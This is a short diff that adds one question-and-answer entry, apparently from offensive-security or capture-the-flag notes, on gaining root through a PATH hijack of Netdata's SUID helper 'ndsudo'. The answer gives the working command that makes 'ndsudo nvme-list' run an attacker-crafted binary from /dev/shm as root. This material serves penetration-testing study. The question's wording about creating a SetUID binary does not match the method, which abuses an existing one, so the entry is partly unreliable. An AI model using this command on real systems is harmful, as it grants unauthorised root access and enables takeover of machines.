@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How do you create a SetUID binary to gain root access on the system?
+
+CONTEXT:
+You have uploaded your crafted binary to /dev/shm on the target.
+
+METHOD / ANSWER:
+Command: `PATH=/dev/shm:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list`
+Explanation: By setting the PATH variable, this command executes your binary as root, leveraging the SUID permissions.
